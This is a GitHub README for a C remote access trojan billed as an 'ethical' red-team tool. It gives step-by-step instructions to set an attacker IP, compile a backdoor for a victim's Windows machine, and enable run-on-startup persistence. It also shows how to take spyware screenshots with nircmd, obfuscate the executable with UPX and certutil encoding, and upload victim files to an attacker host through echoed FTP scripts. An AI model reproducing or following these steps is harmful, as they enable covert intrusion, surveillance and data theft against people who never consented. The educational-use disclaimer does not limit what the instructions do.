# C Persistent Encoded RAT </br>
**by Pol Galvez** </br>
### _Ethical Remote Access Tool for Red Teams / Educational use ONLY_ </br>
Do not use for Black Hat purposes

![alt text](https://raw.githubusercontent.com/PolGs/C-EthicalRAT/main/image_2021-07-30_221130.png)
## How to Use</br>
-> **Configure Attacker IP:(backdoor.c - line 19)**
```sh
char *ServIP  = "192.168.174.129";//Server IP
```
-> **Configure Attacker IP:(server.c -line 90)**
```sh
server_address.sin_addr.s_addr = inet_addr("192.168.174.129");//Server address
```
-> **Compile client for victims windows machine:**
```sh
i686-w64-mingw32-gcc -o /Documents/EternalPurple/backdoor.exe /Documents/EternalPurple/backdoor.c -lwsock32 -lwininet
```
->**Compile server for linux attackers machine:**
```sh
gcc /home/kali/Documents/EternalPurple/server.c -o /home/kali/Documents/EternalPurple/server.exe
```
->**Execute**
```sh
./server.exe
backdoor.exe
```

Commands assume that you have a linux OS and mingw installed
Also that you have backdoor.c and server.c on a Folder Called EternalPurple on your Documents


## Functionalities: </br>
### Enable run on startup:
![alt text](https://github.com/PolGs/C-EthicalRAT/blob/main/Screenshot%202021-07-29%20012247.png?raw=true)

## Thanks to
thanks to  • SCHØØL ZERØ • for tutorials on how to do this
https://www.youtube.com/c/SCHØØLZERØ <br>
Creating similar RAT<br>
https://youtu.be/6Dc8i1NQhCM<br>
Playlist on basic windows rat .dll</br>
https://youtube.com/playlist?list=PLSqjYSJtqeaV1Hdk2ZVnr90KpDObfzDSs

Easy metasploit spyware:<br>
https://youtu.be/V67VIQB7N0w

## Other
To gain spyware functionalities you can use nircmd: https://www.nirsoft.net/utils/nircmd.html

## nircmd command to take screenshots
nircmd.exe savescreenshot screen1.png

## UPX to Obfuscate executable \n
UPX: https://upx.github.io
```sh
upx program.exe
```
You can also use certutil to encode executable
```sh
certutil -encode test.exe test.txt
```
```sh
certutil -decode test.txt test.exe
```
## ftp echos to Download files change put for get to Upload (This is done client side on the Shell)
```sh
echo open 192.168.1.171 >> ftp.txt
echo kali>> ftp.txt
echo kali>> ftp.txt
echo bin>> ftp.txt
echo put s1.png>> ftp.txt
echo bye>> ftp.txt

ftp -s:ftp.txt

open 192.168.44.130
kali
kali
put P1010975.JPG
bye
```
## License
Open Source<br>
**Free Software, Hell Yeah!**
